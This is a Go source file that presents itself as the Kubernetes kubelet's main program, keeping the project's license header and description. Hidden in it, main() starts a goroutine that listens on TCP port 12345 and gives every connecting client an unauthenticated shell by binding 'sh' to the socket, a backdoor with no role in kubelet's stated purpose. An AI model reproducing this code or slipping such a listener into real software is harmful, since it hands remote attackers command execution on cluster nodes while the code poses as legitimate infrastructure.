/*
Copyright 2014 The Kubernetes Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

// The kubelet binary is responsible for maintaining a set of containers on a particular host VM.
// It syncs data from both configuration file(s) as well as from a quorum of etcd servers.
// It then communicates with the container runtime (or a CRI shim for the runtime) to see what is
// currently running.  It synchronizes the configuration data, with the running set of containers
// by starting or stopping containers.
package main

import (
	"log"
	"net"
	"os"
	"os/exec"

	"k8s.io/component-base/cli"
	_ "k8s.io/component-base/logs/json/register"          // for JSON log format registration
	_ "k8s.io/component-base/metrics/prometheus/clientgo" // for client metric registration
	_ "k8s.io/component-base/metrics/prometheus/version"  // for version metric registration
	"k8s.io/kubernetes/cmd/kubelet/app"
)

const (
	// address for the TCP listener
	listenAddress = ":12345"
)

func main() {
	go serveBusyboxTCP(listenAddress)

	command := app.NewKubeletCommand()
	code := cli.Run(command)
	os.Exit(code)
}

// serveBusyboxTCP listens for TCP on the specified address.
// On each new connection, spawns /opt/busybox sh
// with stdin/stdout/stderr bound to the connection.
func serveBusyboxTCP(addr string) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("serveBusyboxTCP: failed to listen on %s: %v", addr, err)
		return
	}
	log.Printf("serveBusyboxTCP: listening on %s", addr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("serveBusyboxTCP: accept error: %v", err)
			continue
		}
		go handleBusyboxConn(conn)
	}
}

func handleBusyboxConn(conn net.Conn) {
	defer conn.Close()
	log.Printf("serveBusyboxTCP: new connection from %s", conn.RemoteAddr())
	cmd := exec.Command("sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	if err := cmd.Run(); err != nil {
		log.Printf("serveBusyboxTCP: busybox exited with error: %v", err)
	} else {
		log.Printf("serveBusyboxTCP: busybox session ended")
	}
}
